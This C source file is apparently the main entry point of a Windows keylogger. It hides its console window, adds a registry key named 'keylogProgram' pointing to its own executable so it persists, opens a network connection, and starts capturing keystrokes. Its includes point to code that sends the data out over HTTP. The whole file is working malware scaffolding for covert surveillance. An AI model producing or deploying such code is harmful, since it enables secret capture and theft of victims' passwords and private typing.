#include "../include/connect.h"
#include "../include/sendoverhttp.h"
#include "../include/monitoring.h"
#include "../include/regaction.h"

#include <signal.h>

#pragma comment(lib,"Ws2_32.lib")

void signalHandler(int signum) {
    closesocket(tcpSocket);
    exit(signum);
}

int main() {
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    signal(SIGINT, signalHandler);

    WCHAR fullPathToExe[MAX_PATH];
    GetModuleFileNameW(NULL, fullPathToExe, MAX_PATH);
    createRegisteryKey(fullPathToExe, L"keylogProgram");

    if (initializeConnection()) {
        startMonitorKeyStrokes();
    }
    return 0;
}